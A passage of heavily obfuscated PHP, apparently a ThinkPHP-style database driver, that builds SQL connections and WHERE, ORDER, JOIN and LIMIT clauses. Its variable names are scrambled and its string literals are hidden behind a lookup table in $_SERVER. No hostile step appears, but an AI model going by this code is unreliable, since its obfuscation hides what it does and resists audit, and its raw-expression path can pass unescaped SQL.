=> $DÕŠ¸ÍÉµå[$Fê¾ˆ£êó—[653]], $Fê¾ˆ£êó—[564] => $DÕŠ¸ÍÉµå[$Fê¾ˆ£êó—[654]], $Fê¾ˆ£êó—[565] => $DÕŠ¸ÍÉµå[$Fê¾ˆ£êó—[655]], $Fê¾ˆ£êó—[17] => $DÕŠ¸ÍÉµå[$Fê¾ˆ£êó—[656]], $Fê¾ˆ£êó—[598] => $DÕŠ¸ÍÉµå[$Fê¾ˆ£êó—[657]], $Fê¾ˆ£êó—[13] => $DÕŠ¸ÍÉµå[$Fê¾ˆ£êó—[658]]); } elseif (empty($DÕŠ¸ÍÉµå)) { if (think_config($Fê¾ˆ£êó—[494]) && $Fê¾ˆ£êó—[492] != strtolower(think_config($Fê¾ˆ£êó—[491]))) { $DÕŠ¸ÍÉµå = $this->parseDSN(think_config($Fê¾ˆ£êó—[494])); } else { $DÕŠ¸ÍÉµå = array($Fê¾ˆ£êó—[646] => think_config($Fê¾ˆ£êó—[491]), $Fê¾ˆ£êó—[566] => think_config($Fê¾ˆ£êó—[659]), $Fê¾ˆ£êó—[567] => think_config($Fê¾ˆ£êó—[660]), $Fê¾ˆ£êó—[564] => think_config($Fê¾ˆ£êó—[661]), $Fê¾ˆ£êó—[565] => think_config($Fê¾ˆ£êó—[662]), $Fê¾ˆ£êó—[17] => think_config($Fê¾ˆ£êó—[238]), $Fê¾ˆ£êó—[598] => think_config($Fê¾ˆ£êó—[494]), $Fê¾ˆ£êó—[13] => think_config($Fê¾ˆ£êó—[663])); } } return $DÕŠ¸ÍÉµå; } protected function initConnect($a‚æÖå‰Ÿø = true) { if (1 == think_config($_SERVER[İë¬“ÅÒÛ›][18])) { $this->_linkID = $this->multiConnect($a‚æÖå‰Ÿø); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($e‚ØßŸ”Ü’ = false) { $DÅÅî°·ŠĞ =& $_SERVER[İë¬“ÅÒÛ›]; static $bŒˆ§ŞÀÅŠ = array(); if (empty($bŒˆ§ŞÀÅŠ)) { foreach ($this->config as $Eìé„ñÀö  => $dù¾ãœ‹£Ñ) { $bŒˆ§ŞÀÅŠ[$Eìé„ñÀö ] = explode($DÅÅî°·ŠĞ[47], $dù¾ãœ‹£Ñ); } } if (think_config($DÅÅî°·ŠĞ[664])) { if ($e‚ØßŸ”Ü’) { $dÓáÂÆ‰âò = floor(mt_rand(0, think_config($DÅÅî°·ŠĞ[665]) - 1)); } else { if (is_numeric(think_config($DÅÅî°·ŠĞ[666]))) { $dÓáÂÆ‰âò = think_config($DÅÅî°·ŠĞ[666]); } else { $dÓáÂÆ‰âò = floor(mt_rand(think_config($DÅÅî°·ŠĞ[665]), count($bŒˆ§ŞÀÅŠ[$DÅÅî°·ŠĞ[564]]) - 1)); } } } else { $dÓáÂÆ‰âò = floor(mt_rand(0, count($bŒˆ§ŞÀÅŠ[$DÅÅî°·ŠĞ[564]]) - 1)); } $bÙãÔÌÆ…œ = array($DÅÅî°·ŠĞ[566] => isset($bŒˆ§ŞÀÅŠ[$DÅÅî°·ŠĞ[566]][$dÓáÂÆ‰âò]) ? $bŒˆ§ŞÀÅŠ[$DÅÅî°·ŠĞ[566]][$dÓáÂÆ‰âò] : $bŒˆ§ŞÀÅŠ[$DÅÅî°·ŠĞ[566]][0], $DÅÅî°·ŠĞ[567] => isset($bŒˆ§ŞÀÅŠ[$DÅÅî°·ŠĞ[567]][$dÓáÂÆ‰âò]) ? $bŒˆ§ŞÀÅŠ[$DÅÅî°·ŠĞ[567]][$dÓáÂÆ‰âò] : $bŒˆ§ŞÀÅŠ[$DÅÅî°·ŠĞ[567]][0], $DÅÅî°·ŠĞ[564] => isset($bŒˆ§ŞÀÅŠ[$DÅÅî°·ŠĞ[564]][$dÓáÂÆ‰âò]) ? $bŒˆ§ŞÀÅŠ[$DÅÅî°·ŠĞ[564]][$dÓáÂÆ‰âò] : $bŒˆ§ŞÀÅŠ[$DÅÅî°·ŠĞ[564]][0], $DÅÅî°·ŠĞ[565] => isset($bŒˆ§ŞÀÅŠ[$DÅÅî°·ŠĞ[565]][$dÓáÂÆ‰âò]) ? $bŒˆ§ŞÀÅŠ[$DÅÅî°·ŠĞ[565]][$dÓáÂÆ‰âò] : $bŒˆ§ŞÀÅŠ[$DÅÅî°·ŠĞ[565]][0], $DÅÅî°·ŠĞ[17] => isset($bŒˆ§ŞÀÅŠ[$DÅÅî°·ŠĞ[17]][$dÓáÂÆ‰âò]) ? $bŒˆ§ŞÀÅŠ[$DÅÅî°·ŠĞ[17]][$dÓáÂÆ‰âò] : $bŒˆ§ŞÀÅŠ[$DÅÅî°·ŠĞ[17]][0], $DÅÅî°·ŠĞ[598] => isset($bŒˆ§ŞÀÅŠ[$DÅÅî°·ŠĞ[598]][$dÓáÂÆ‰âò]) ? $bŒˆ§ŞÀÅŠ[$DÅÅî°·ŠĞ[598]][$dÓáÂÆ‰âò] : $bŒˆ§ŞÀÅŠ[$DÅÅî°·ŠĞ[598]][0], $DÅÅî°·ŠĞ[13] => isset($bŒˆ§ŞÀÅŠ[$DÅÅî°·ŠĞ[13]][$dÓáÂÆ‰âò]) ? $bŒˆ§ŞÀÅŠ[$DÅÅî°·ŠĞ[13]][$dÓáÂÆ‰âò] : $bŒˆ§ŞÀÅŠ[$DÅÅî°·ŠĞ[13]][0]); return $this->connect($bÙãÔÌÆ…œ, $dÓáÂÆ‰âò); } public function parseDSN($Dê¯™…‚‹) { $Cõùº…Øæ =& $_SERVER[İë¬“ÅÒÛ›]; if (empty($Dê¯™…‚‹)) { return !1; } $CÆŠŠì½ = parse_url($Dê¯™…‚‹); if ($CÆŠŠì½[$Cõùº…Øæ[165]]) { $AæõÃêäóÀ = array($Cõùº…Øæ[646] => $CÆŠŠì½[$Cõùº…Øæ[165]], $Cõùº…Øæ[566] => isset($CÆŠŠì½[$Cõùº…Øæ[417]]) ? $CÆŠŠì½[$Cõùº…Øæ[417]] : $Cõùº…Øæ[33], $Cõùº…Øæ[567] => isset($CÆŠŠì½[$Cõùº…Øæ[667]]) ? $CÆŠŠì½[$Cõùº…Øæ[667]] : $Cõùº…Øæ[33], $Cõùº…Øæ[564] => isset($CÆŠŠì½[$Cõùº…Øæ[166]]) ? $CÆŠŠì½[$Cõùº…Øæ[166]] : $Cõùº…Øæ[33], $Cõùº…Øæ[565] => isset($CÆŠŠì½[$Cõùº…Øæ[167]]) ? $CÆŠŠì½[$Cõùº…Øæ[167]] : $Cõùº…Øæ[33], $Cõùº…Øæ[17] => isset($CÆŠŠì½[$Cõùº…Øæ[76]]) ? substr($CÆŠŠì½[$Cõùº…Øæ[76]], 1) : $Cõùº…Øæ[33]); } else { preg_match($Cõùº…Øæ[668], trim($Dê¯™…‚‹), $BƒÎ«Ğ); $AæõÃêäóÀ = array($Cõùº…Øæ[646] => $BƒÎ«Ğ[1], $Cõùº…Øæ[566] => $BƒÎ«Ğ[2], $Cõùº…Øæ[567] => $BƒÎ«Ğ[3], $Cõùº…Øæ[564] => $BƒÎ«Ğ[4], $Cõùº…Øæ[565] => $BƒÎ«Ğ[5], $Cõùº…Øæ[17] => $BƒÎ«Ğ[6]); } $AæõÃêäóÀ[$Cõùº…Øæ[598]] = $Cõùº…Øæ[33]; return $AæõÃêäóÀ; } protected function debug() { $d’ÁÏµéä· =& $_SERVER[İë¬“ÅÒÛ›]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $d’ÁÏµéä·[669]; if (think_config($d’ÁÏµéä·[670])) { think_status($d’ÁÏµéä·[671]); think_trace($this->queryStr . $d’ÁÏµéä·[672] . think_status($d’ÁÏµéä·[20], $d’ÁÏµéä·[671], 6) . $d’ÁÏµéä·[673], $d’ÁÏµéä·[33], $d’ÁÏµéä·[674]); } } protected function parseLock($bÛÎ”º…ƒå = false) { $b“ÁŒçãàÔ =& $_SERVER[İë¬“ÅÒÛ›]; if (!$bÛÎ”º…ƒå) { return $b“ÁŒçãàÔ[33]; } if ($b“ÁŒçãàÔ[600] == $this->dbType) { return $b“ÁŒçãàÔ[675]; } return $b“ÁŒçãàÔ[676]; } protected function parseSet($bªŸ’®î––) { $Eå†Ş‘‡×Ê =& $_SERVER[İë¬“ÅÒÛ›]; foreach ($bªŸ’®î–– as $BßîÈ‘Ùë => $eòÊÌ³§ò) { if (is_array($eòÊÌ³§ò) && $Eå†Ş‘‡×Ê[289] == $eòÊÌ³§ò[0]) { $f¢·äËÕê‰[] = $this->parseKey($BßîÈ‘Ùë) . $Eå†Ş‘‡×Ê[677] . $eòÊÌ³§ò[1]; } elseif (is_scalar($eòÊÌ³§ò) || is_null($eòÊÌ³§ò)) { $f¢·äËÕê‰[] = $this->parseKey($BßîÈ‘Ùë) . $Eå†Ş‘‡×Ê[677] . $this->parseValue($eòÊÌ³§ò); } } return $Eå†Ş‘‡×Ê[678] . implode($Eå†Ş‘‡×Ê[47], $f¢·äËÕê‰); } protected function bindParam($bÔ¿ŒÂ¥, $d¹…Şƒˆ) { $this->bind[$_SERVER[İë¬“ÅÒÛ›][4] . $bÔ¿ŒÂ¥] = $d¹…Şƒˆ; } protected function parseBind($DšÒÑ®‡å£) { $DšÒÑ®‡å£ = array_merge($this->bind, $DšÒÑ®‡å£); $this->bind = array(); return $DšÒÑ®‡å£; } function parseKey(&$bÙÕëÉ–Ñ˜, $AÕ÷ğàœ˜ó = true) { if ($AÕ÷ğàœ˜ó) { $bÙÕëÉ–Ñ˜ = $this->parseKeyCheck($bÙÕëÉ–Ñ˜); } return $bÙÕëÉ–Ñ˜; } function parseKeyCheck($c¤«ÑÍÅùÙ) { $fÙÍ–‰ ² =& $_SERVER[İë¬“ÅÒÛ›]; $c¤«ÑÍÅùÙ = trim($c¤«ÑÍÅùÙ); if (!preg_match($fÙÍ–‰ ²[679], $c¤«ÑÍÅùÙ)) { think_exception($fÙÍ–‰ ²[680] . $c¤«ÑÍÅùÙ); } return $c¤«ÑÍÅùÙ; } protected function parseValue($bçœ¡Ş‚²´) { $fÑÏ–ÇŒ°² =& $_SERVER[İë¬“ÅÒÛ›]; if (is_string($bçœ¡Ş‚²´)) { $bçœ¡Ş‚²´ = $fÑÏ–ÇŒ°²[639] . $this->escapeString($bçœ¡Ş‚²´) . $fÑÏ–ÇŒ°²[639]; } elseif (isset($bçœ¡Ş‚²´[0]) && is_string($bçœ¡Ş‚²´[0]) && strtolower($bçœ¡Ş‚²´[0]) == $fÑÏ–ÇŒ°²[289]) { $bçœ¡Ş‚²´ = $this->escapeString($bçœ¡Ş‚²´[1]); } elseif (is_array($bçœ¡Ş‚²´)) { $bçœ¡Ş‚²´ = array_map(array($this, $fÑÏ–ÇŒ°²[640]), $bçœ¡Ş‚²´); } elseif (is_bool($bçœ¡Ş‚²´)) { $bçœ¡Ş‚²´ = $bçœ¡Ş‚²´ ? $fÑÏ–ÇŒ°²[377] : $fÑÏ–ÇŒ°²[403]; } elseif (is_null($bçœ¡Ş‚²´)) { $bçœ¡Ş‚²´ = $fÑÏ–ÇŒ°²[100]; } return $bçœ¡Ş‚²´; } protected function parseField($CĞµ‹®ñîè) { $dø÷ïùøÇ½ =& $_SERVER[İë¬“ÅÒÛ›]; if (is_string($CĞµ‹®ñîè) && strpos($CĞµ‹®ñîè, $dø÷ïùøÇ½[47])) { $CĞµ‹®ñîè = explode($dø÷ïùøÇ½[47], $CĞµ‹®ñîè); } if (is_array($CĞµ‹®ñîè)) { $DÔã‰Œ‘‚ñ = array(); foreach ($CĞµ‹®ñîè as $c”è×½éò => $d±‘Ù—í) { if (!is_numeric($c”è×½éò)) { $DÔã‰Œ‘‚ñ[] = $this->parseKey($c”è×½éò) . $dø÷ïùøÇ½[681] . $this->parseKey($d±‘Ù—í); } else { $DÔã‰Œ‘‚ñ[] = $this->parseKey($d±‘Ù—í); } } $AµÙ×¸ éÙ = implode($dø÷ïùøÇ½[47], $DÔã‰Œ‘‚ñ); } elseif (is_string($CĞµ‹®ñîè) && !empty($CĞµ‹®ñîè)) { $AµÙ×¸ éÙ = $CĞµ‹®ñîè; } else { $AµÙ×¸ éÙ = $dø÷ïùøÇ½[173]; } return $AµÙ×¸ éÙ; } protected function parseTable($dÃóè©ŞÒ) { $EØºÔïÉ =& $_SERVER[İë¬“ÅÒÛ›]; if (is_array($dÃóè©ŞÒ)) { $Dî…»ÏŠŒƒ = array(); foreach ($dÃóè©ŞÒ as $E¿ìôÊİÄ => $F²ÆŸÜÂšâ) { if (!is_numeric($E¿ìôÊİÄ)) { $Dî…»ÏŠŒƒ[] = $this->parseKey($E¿ìôÊİÄ) . $EØºÔïÉ[50] . $this->parseKey($F²ÆŸÜÂšâ); } else { $Dî…»ÏŠŒƒ[] = $this->parseKey($E¿ìôÊİÄ); } } $dÃóè©ŞÒ = $Dî…»ÏŠŒƒ; } elseif (is_string($dÃóè©ŞÒ)) { if (strstr($dÃóè©ŞÒ, $EØºÔïÉ[50])) { return $dÃóè©ŞÒ; } $dÃóè©ŞÒ = explode($EØºÔïÉ[47], $dÃóè©ŞÒ); array_walk($dÃóè©ŞÒ, array($this, $EØºÔïÉ[583])); } return $EØºÔïÉ[682] . trim(implode($EØºÔïÉ[683], $dÃóè©ŞÒ), $EØºÔïÉ[589]) . $EØºÔïÉ[682]; } protected function parseWhere($B›÷È¼ƒª¢) { $Fî†ø÷¦ùè =& $_SERVER[İë¬“ÅÒÛ›]; $FÁ¬¦½™Âš = $Fî†ø÷¦ùè[33]; if (is_string($B›÷È¼ƒª¢)) { $FÁ¬¦½™Âš = $B›÷È¼ƒª¢; } else { $d‡ï‘©Ùƒ¼ = isset($B›÷È¼ƒª¢[$Fî†ø÷¦ùè[684]]) ? strtoupper($B›÷È¼ƒª¢[$Fî†ø÷¦ùè[684]]) : $Fî†ø÷¦ùè[33]; if (in_array($d‡ï‘©Ùƒ¼, array($Fî†ø÷¦ùè[685], $Fî†ø÷¦ùè[686], $Fî†ø÷¦ùè[687]))) { $d‡ï‘©Ùƒ¼ = $Fî†ø÷¦ùè[50] . $d‡ï‘©Ùƒ¼ . $Fî†ø÷¦ùè[50]; unset($B›÷È¼ƒª¢[$Fî†ø÷¦ùè[684]]); } else { $d‡ï‘©Ùƒ¼ = $Fî†ø÷¦ùè[688]; } foreach ($B›÷È¼ƒª¢ as $FØ‹ŠŠÜ–Ğ => $fÕÌÓ“‡»«) { $FÁ¬¦½™Âš .= $Fî†ø÷¦ùè[269]; if (is_numeric($FØ‹ŠŠÜ–Ğ)) { $FØ‹ŠŠÜ–Ğ = $Fî†ø÷¦ùè[689]; } if (0 === strpos($FØ‹ŠŠÜ–Ğ, $Fî†ø÷¦ùè[71])) { $FÁ¬¦½™Âš .= $this->parseThinkWhere($FØ‹ŠŠÜ–Ğ, $fÕÌÓ“‡»«); } else { if (!preg_match($Fî†ø÷¦ùè[690], trim($FØ‹ŠŠÜ–Ğ))) { think_exception(think_lang($Fî†ø÷¦ùè[691]) . $Fî†ø÷¦ùè[4] . $FØ‹ŠŠÜ–Ğ); } $f…ê²ïÙĞ¡ = is_array($fÕÌÓ“‡»«) && isset($fÕÌÓ“‡»«[$Fî†ø÷¦ùè[692]]); $FØ‹ŠŠÜ–Ğ = trim($FØ‹ŠŠÜ–Ğ); if (strpos($FØ‹ŠŠÜ–Ğ, $Fî†ø÷¦ùè[275])) { $BÏÓÄ±Äµ¸ = explode($Fî†ø÷¦ùè[275], $FØ‹ŠŠÜ–Ğ); $BÎÂî÷£ÅŞ = array(); foreach ($BÏÓÄ±Äµ¸ as $e½âŒ†Ú¤ => $b¼ˆÙÁì«) { $cÔ—×ÁÂ°× = $f…ê²ïÙĞ¡ ? $fÕÌÓ“‡»«[$e½âŒ†Ú¤] : $fÕÌÓ“‡»«; $BÎÂî÷£ÅŞ[] = $Fî†ø÷¦ùè[252] . $this->parseWhereItem($this->parseKey($b¼ˆÙÁì«), $cÔ—×ÁÂ°×) . $Fî†ø÷¦ùè[582]; } $FÁ¬¦½™Âš .= implode($Fî†ø÷¦ùè[693], $BÎÂî÷£ÅŞ); } elseif (strpos($FØ‹ŠŠÜ–Ğ, $Fî†ø÷¦ùè[276])) { $BÏÓÄ±Äµ¸ = explode($Fî†ø÷¦ùè[276], $FØ‹ŠŠÜ–Ğ); $BÎÂî÷£ÅŞ = array(); foreach ($BÏÓÄ±Äµ¸ as $e½âŒ†Ú¤ => $b¼ˆÙÁì«) { $cÔ—×ÁÂ°× = $f…ê²ïÙĞ¡ ? $fÕÌÓ“‡»«[$e½âŒ†Ú¤] : $fÕÌÓ“‡»«; $BÎÂî÷£ÅŞ[] = $Fî†ø÷¦ùè[252] . $this->parseWhereItem($this->parseKey($b¼ˆÙÁì«), $cÔ—×ÁÂ°×) . $Fî†ø÷¦ùè[582]; } $FÁ¬¦½™Âš .= implode($Fî†ø÷¦ùè[688], $BÎÂî÷£ÅŞ); } else { $FÁ¬¦½™Âš .= $this->parseWhereItem($this->parseKey($FØ‹ŠŠÜ–Ğ), $fÕÌÓ“‡»«); } } $FÁ¬¦½™Âš .= $Fî†ø÷¦ùè[270] . $d‡ï‘©Ùƒ¼; } $FÁ¬¦½™Âš = substr($FÁ¬¦½™Âš, 0, -strlen($d‡ï‘©Ùƒ¼)); } return empty($FÁ¬¦½™Âš) ? $Fî†ø÷¦ùè[33] : $Fî†ø÷¦ùè[694] . $FÁ¬¦½™Âš; } protected function parseWhereItem($a±ê™Ïîƒ, $CÉŸÅóÁò÷) { $Ağ÷•„¸ß =& $_SERVER[İë¬“ÅÒÛ›]; $E¸ĞÃÄĞ‹Ú = $Ağ÷•„¸ß[33]; if (is_array($CÉŸÅóÁò÷)) { if (is_string($CÉŸÅóÁò÷[0])) { $EÍ½öÛ¸À = strtolower($CÉŸÅóÁò÷[0]); if (in_array($CÉŸÅóÁò÷[0], array($Ağ÷•„¸ß[677], $Ağ÷•„¸ß[695], $Ağ÷•„¸ß[696], $Ağ÷•„¸ß[697], $Ağ÷•„¸ß[698], $Ağ÷•„¸ß[699]))) { $E¸ĞÃÄĞ‹Ú .= $a±ê™Ïîƒ . $Ağ÷•„¸ß[50] . $CÉŸÅóÁò÷[0] . $Ağ÷•„¸ß[50] . $this->parseValue($CÉŸÅóÁò÷[1]); } elseif (preg_match($Ağ÷•„¸ß[700], $CÉŸÅóÁò÷[0])) { $E¸ĞÃÄĞ‹Ú .= $a±ê™Ïîƒ . $Ağ÷•„¸ß[50] . $this->exp[$EÍ½öÛ¸À] . $Ağ÷•„¸ß[50] . $this->parseValue($CÉŸÅóÁò÷[1]); } elseif (preg_match($Ağ÷•„¸ß[701], $CÉŸÅóÁò÷[0])) { if (is_array($CÉŸÅóÁò÷[1])) { $Cîáìãã‚³ = isset($CÉŸÅóÁò÷[2]) ? strtoupper($CÉŸÅóÁò÷[2]) : $Ağ÷•„¸ß[686]; if (in_array($Cîáìãã‚³, array($Ağ÷•„¸ß[685], $Ağ÷•„¸ß[686], $Ağ÷•„¸ß[687]))) { $Cá‘˜ ÍŒÌ = array(); foreach ($CÉŸÅóÁò÷[1] as $fŠÀ—äå‡) { $Cá‘˜ ÍŒÌ[] = $a±ê™Ïîƒ . $Ağ÷•„¸ß[50] . $this->exp[$EÍ½öÛ¸À] . $Ağ÷•„¸ß[50] . $this->parseValue($fŠÀ—äå‡); } $E¸ĞÃÄĞ‹Ú .= $Ağ÷•„¸ß[252] . implode($Ağ÷•„¸ß[50] . $Cîáìãã‚³ . $Ağ÷•„¸ß[50], $Cá‘˜ ÍŒÌ) . $Ağ÷•„¸ß[582]; } } else { $E¸ĞÃÄĞ‹Ú .= $a±ê™Ïîƒ . $Ağ÷•„¸ß[50] . $this->exp[$EÍ½öÛ¸À] . $Ağ÷•„¸ß[50] . $this->parseValue($CÉŸÅóÁò÷[1]); } } elseif ($Ağ÷•„¸ß[289] == $EÍ½öÛ¸À) { $E¸ĞÃÄĞ‹Ú .= $Ağ÷•„¸ß[580] . $a±ê™Ïîƒ . $Ağ÷•„¸ß[50] . $CÉŸÅóÁò÷[1] . $Ağ÷•„¸ß[702]; } elseif (preg_match($Ağ÷•„¸ß[703], $CÉŸÅóÁò÷[0])) { if (isset($CÉŸÅóÁò÷[2]) && $Ağ÷•„¸ß[289] == $CÉŸÅóÁò÷[2]) { $E¸ĞÃÄĞ‹Ú .= $a±ê™Ïîƒ . $Ağ÷•„¸ß[50] . $this->exp[$EÍ½öÛ¸À] . $Ağ÷•„¸ß[50] . $CÉŸÅóÁò÷[1]; } else { if (is_string($CÉŸÅóÁò÷[1])) { $CÉŸÅóÁò÷[1] = explode($Ağ÷•„¸ß[47], $CÉŸÅóÁò÷[1]); } $B Ö†Œ¼ŒÙ = implode($Ağ÷•„¸ß[47], $this->parseValue($CÉŸÅóÁò÷[1])); $E¸ĞÃÄĞ‹Ú .= $a±ê™Ïîƒ . $Ağ÷•„¸ß[50] . $this->exp[$EÍ½öÛ¸À] . $Ağ÷•„¸ß[580] . $B Ö†Œ¼ŒÙ . $Ağ÷•„¸ß[582]; } } elseif (preg_match($Ağ÷•„¸ß[704], $CÉŸÅóÁò÷[0])) { $d±àõ¯‹“³ = is_string($CÉŸÅóÁò÷[1]) ? explode($Ağ÷•„¸ß[47], $CÉŸÅóÁò÷[1]) : $CÉŸÅóÁò÷[1]; $E¸ĞÃÄĞ‹Ú .= $Ağ÷•„¸ß[580] . $a±ê™Ïîƒ . $Ağ÷•„¸ß[50] . $this->exp[$EÍ½öÛ¸À] . $Ağ÷•„¸ß[50] . $this->parseValue($d±àõ¯‹“³[0]) . $Ağ÷•„¸ß[688] . $this->parseValue($d±àõ¯‹“³[1]) . $Ağ÷•„¸ß[270]; } else { think_exception(think_lang($Ağ÷•„¸ß[691]) . $Ağ÷•„¸ß[4] . $CÉŸÅóÁò÷[0]); } } else { $dªòß»îëì = count($CÉŸÅóÁò÷); $DƒÚ› ²“ù = isset($CÉŸÅóÁò÷[$dªòß»îëì - 1]) ? strtoupper($CÉŸÅóÁò÷[$dªòß»îëì - 1]) : $Ağ÷•„¸ß[33]; if (in_array($DƒÚ› ²“ù, array($Ağ÷•„¸ß[685], $Ağ÷•„¸ß[686], $Ağ÷•„¸ß[687]))) { $dªòß»îëì = $dªòß»îëì - 1; } else { $DƒÚ› ²“ù = $Ağ÷•„¸ß[685]; } for ($C˜ ¢¡ˆÛ = 0; $C˜ ¢¡ˆÛ < $dªòß»îëì; $C˜ ¢¡ˆÛ++) { $d±àõ¯‹“³ = is_array($CÉŸÅóÁò÷[$C˜ ¢¡ˆÛ]) ? $CÉŸÅóÁò÷[$C˜ ¢¡ˆÛ][1] : $CÉŸÅóÁò÷[$C˜ ¢¡ˆÛ]; if ($Ağ÷•„¸ß[289] == strtolower($CÉŸÅóÁò÷[$C˜ ¢¡ˆÛ][0])) { $E¸ĞÃÄĞ‹Ú .= $Ağ÷•„¸ß[252] . $a±ê™Ïîƒ . $Ağ÷•„¸ß[50] . $d±àõ¯‹“³ . $Ağ÷•„¸ß[702] . $DƒÚ› ²“ù . $Ağ÷•„¸ß[50]; } else { $aÊëòÙ®š¾ = is_array($CÉŸÅóÁò÷[$C˜ ¢¡ˆÛ]) ? $this->exp[strtolower($CÉŸÅóÁò÷[$C˜ ¢¡ˆÛ][0])] : $Ağ÷•„¸ß[677]; if (!$aÊëòÙ®š¾ && is_array($CÉŸÅóÁò÷[$C˜ ¢¡ˆÛ]) && in_array($CÉŸÅóÁò÷[$C˜ ¢¡ˆÛ][0], array($Ağ÷•„¸ß[677], $Ağ÷•„¸ß[695], $Ağ÷•„¸ß[696], $Ağ÷•„¸ß[697], $Ağ÷•„¸ß[698], $Ağ÷•„¸ß[699]))) { $aÊëòÙ®š¾ = $CÉŸÅóÁò÷[$C˜ ¢¡ˆÛ][0]; } $E¸ĞÃÄĞ‹Ú .= $Ağ÷•„¸ß[252] . $a±ê™Ïîƒ . $Ağ÷•„¸ß[50] . $aÊëòÙ®š¾ . $Ağ÷•„¸ß[50] . $this->parseValue($d±àõ¯‹“³) . $Ağ÷•„¸ß[702] . $DƒÚ› ²“ù . $Ağ÷•„¸ß[50]; } } $E¸ĞÃÄĞ‹Ú = substr($E¸ĞÃÄĞ‹Ú, 0, -4); } } else { $E¸ĞÃÄĞ‹Ú .= $a±ê™Ïîƒ . $Ağ÷•„¸ß[705] . $this->parseValue($CÉŸÅóÁò÷); } return $E¸ĞÃÄĞ‹Ú; } protected function parseThinkWhere($cÏ»¬øÕÜæ, $f•ï”˜†º) { $DÔÉ¯êº³Ş =& $_SERVER[İë¬“ÅÒÛ›]; $dÇ³İ¾°Ô = $DÔÉ¯êº³Ş[33]; switch ($cÏ»¬øÕÜæ) { case $DÔÉ¯êº³Ş[342]: $dÇ³İ¾°Ô = $f•ï”˜†º; break; case $DÔÉ¯êº³Ş[689]: $dÇ³İ¾°Ô = is_string($f•ï”˜†º) ? $f•ï”˜†º : substr($this->parseWhere($f•ï”˜†º), 6); break; case $DÔÉ¯êº³Ş[706]: parse_str($f•ï”˜†º, $aÊĞ¥™å£é); if (isset($aÊĞ¥™å£é[$DÔÉ¯êº³Ş[684]])) { $e¸‡›ìÜÚ¸ = $DÔÉ¯êº³Ş[50] . strtoupper($aÊĞ¥™å£é[$DÔÉ¯êº³Ş[684]]) . $DÔÉ¯êº³Ş[50]; unset($aÊĞ¥™å£é[$DÔÉ¯êº³Ş[684]]); } else { $e¸‡›ìÜÚ¸ = $DÔÉ¯êº³Ş[688]; } $A¿–¸Ãá¤ = array(); foreach ($aÊĞ¥™å£é as $e¤±¬ªÚĞ => $dÌáš‰œµ±) { $A¿–¸Ãá¤[] = $this->parseKey($e¤±¬ªÚĞ) . $DÔÉ¯êº³Ş[705] . $this->parseValue($dÌáš‰œµ±); } $dÇ³İ¾°Ô = implode($e¸‡›ìÜÚ¸, $A¿–¸Ãá¤); break; } return $dÇ³İ¾°Ô; } protected function parseLimit($E‡Ÿğ‘Ğç) { $c‡Â°±ãäæ =& $_SERVER[İë¬“ÅÒÛ›]; return !empty($E‡Ÿğ‘Ğç) ? $c‡Â°±ãäæ[48] . $E‡Ÿğ‘Ğç . $c‡Â°±ãäæ[50] : $c‡Â°±ãäæ[33]; } protected function parseJoin($E«­ƒÙçùİ) { $BÇ•Âİ†º =& $_SERVER[İë¬“ÅÒÛ›]; $c°ã‹º®‚ = $BÇ•Âİ†º[33]; if (!empty($E«­ƒÙçùİ)) { if (is_array($E«­ƒÙçùİ)) { foreach ($E«­ƒÙçùİ as $C¦¸¼‹ïŒ… => $e¨ÎÔ…Õ§‡) { if (!1 !== stripos($e¨ÎÔ…Õ§‡, $BÇ•Âİ†º[707])) { $c°ã‹º®‚ .= $BÇ•Âİ†º[50] . $e¨ÎÔ…Õ§‡; } else { $c°ã‹º®‚ .= $BÇ•Âİ†º[708] . $e¨ÎÔ…Õ§‡; } } } else { $c°ã‹º®‚ .= $BÇ•Âİ†º[708] . $E«­ƒÙçùİ; } } $c°ã‹º®‚ = preg_replace($BÇ•Âİ†º[709], think_config($BÇ•Âİ†º[612]) . $BÇ•Âİ†º[710], $c°ã‹º®‚); return $c°ã‹º®‚; } protected function parseOrder($D†ëÎ¶Å¹Ú) { $F‹ñŸ÷…‚„ =& $_SERVER[İë¬“ÅÒÛ›]; if (is_array($D†ëÎ¶Å¹Ú)) { $däù±êÊ†© = array(); foreach ($D†ëÎ¶Å¹Ú as $A‡Ä’‚í†† => $CÕ‰ŒÁî¨Ü) { if (is_numeric($A‡Ä’‚í††)) { $däù±êÊ†©[] = $this->parseKey($CÕ‰ŒÁî¨Ü); } else { $CÕ‰ŒÁî¨Ü = in_array(strtoupper(trim($CÕ‰ŒÁî¨Ü)), array($F‹ñŸ÷…‚„[711], $F‹ñŸ÷…‚„[712])) ? $F‹ñŸ÷…‚„[50] . $CÕ‰ŒÁî¨Ü : $F‹ñŸ÷…‚„[33]; if (preg_match($F‹ñŸ÷…‚„[713], $A‡Ä’‚í††)) { $däù±êÊ†©[] = $this->parseKey($A‡Ä’‚í††) . $CÕ‰ŒÁî¨Ü; } else { think_exception($F‹ñŸ÷…‚„[714] . $A‡Ä’‚í††); } } } $D†ëÎ¶Å¹Ú = implode($F‹ñŸ÷…‚„[47], $däù±êÊ†©); } return !empty($D†ëÎ¶Å¹Ú) ? $F‹ñŸ÷…‚„[715] . $D†ëÎ¶Å¹Ú : $F‹ñŸ÷…‚„[33]; } protected function parseGroup($AÒœ·ÂËÉÔ) { $e²Ãº¥±ë =& $_SERVER[İë¬“ÅÒÛ›]; return !empty($AÒœ·ÂËÉÔ) ? $e²Ãº¥±ë[716] . $AÒœ·ÂËÉÔ : $e²Ãº¥±ë[33]; } protected function parseHaving($D‘ïÎÇ›£¿) { $C‡®¾éÙß =& $_SERVER[İë¬“ÅÒÛ›]; return !empty($D‘ïÎÇ›£¿) ? $C‡®¾éÙß[717] . $D‘ïÎÇ›£¿ : $C‡®¾éÙß[33]; } protected function parseComment($BÍºĞòîŸÚ) { $EÍ£ª¾ë¨Ê =& $_SERVER[İë¬“ÅÒÛ›]; return !empty($BÍºĞòîŸÚ) ? $EÍ£ª¾ë¨Ê[718] . $BÍºĞòîŸÚ . $EÍ£ª¾ë¨Ê[719] : $EÍ£ª¾ë¨Ê[33]; } protected function parseDistinct($fÍÓÄ«÷‚¬) { $C„òó”£Ô¹ =& $_SERVER[İë¬“ÅÒÛ›]; return !empty($fÍÓÄ«÷‚¬) ? $C„òó”£Ô¹[720] : $C„òó”£Ô¹[33]; } protected function parseUnion($AŠÀªÉ©õê) { $DÁøâ¸« =& $_SERVER[İë¬“ÅÒÛ›]; if (empty($AŠÀªÉ©õê)) { return $DÁøâ¸«[33]; } if (isset($AŠÀªÉ©õê[$DÁøâ¸«[340]])) { 